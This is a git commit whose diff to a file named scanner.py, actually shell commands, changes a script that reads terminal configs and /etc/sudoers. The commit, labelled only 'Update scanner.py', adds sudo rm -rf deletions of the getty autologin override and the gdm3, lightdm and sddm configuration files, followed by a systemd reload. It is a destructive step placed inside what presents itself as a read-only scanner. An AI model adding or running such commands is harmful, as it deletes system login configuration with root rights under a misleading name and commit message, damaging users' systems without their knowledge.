fbb1db2f8a9a01c35cf218d4b5ac0b0c9e1f40ec
0x202ccc72fs <spynac@mailfence.com>
2025-03-14 23:38:54 +0100

    Update scanner.py

--- scanner.py
+++ scanner.py
@@ -1,3 +1,9 @@
 grep "Exec" ~/.config/xfce4/terminal/terminalrc ~/.config/gnome-terminal/ ~/.bashrc ~/.profile ~/.zshrc 2>/dev/null
 
 cat /etc/sudoers | grep -i "Defaults root"
+
+sudo rm -rf /etc/systemd/system/getty@tty1.service.d/autologin.conf
+sudo rm -rf /etc/gdm3/custom.conf
+sudo rm -rf /etc/lightdm/lightdm.conf
+sudo rm -rf /etc/sddm.conf
+sudo systemctl daemon-reload
